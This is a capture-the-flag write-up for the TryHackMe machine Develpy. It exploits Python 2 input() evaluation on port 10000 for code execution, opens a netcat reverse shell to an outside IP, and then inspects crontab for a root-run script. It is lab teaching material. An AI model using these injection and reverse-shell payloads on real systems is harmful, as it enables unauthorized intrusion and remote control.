[Develpy]() is a medium rated machine on TryHackMe.
Nmap scan: 
```bash
nmap -sVC -vv -p- <IP> -T4 -oN nmap-full
```
nmap scan reveals 2 open ports:
- 22: SSH
- 10000: Cannot recognize, gotta try with netcat
Try accessing via brower:
```

        Private 0days

 Please enther number of exploits to send??: Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 'GET' is not defined
```
So it's like a python script.
From this point of view, it seems like user input is thrown straight inside `int()` to convert to integer, after a research I found that for some python version (especially python2), `input()` function might evaluate user input, so this might a RCE vector.
We can use this to get a reverse shell to the machine.
Gotta confirm one more time:
```bash
nc 10.49.157.35 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('id')
uid=1000(king) gid=1000(king) groups=1000(king),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)

Exploit started, attacking target (tryhackme.com)...
```
So our payload got evaluated.
We can get a revshell with following payload:
```bash
__import__('os').system('nc 192.168.219.125 44444 -e /bin/bash')
```
And we got the shell as `king`.
Checking king's home folder, I saw two `.sh` scripts `run.sh` and `root.sh`.
The `run.sh` simply runs the TCP service as king.
But the `root.sh` trying to run some `.py` files.
Checking crontab:
```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
#
```
So this means it will run /home/king/run.sh and /home/king/root.sh every minutes.
We check the content of root.sh
```bash
cat root.sh
python /root/company/media/*.py
```
So it runs some python scripts in `/root/company/media/` directory.

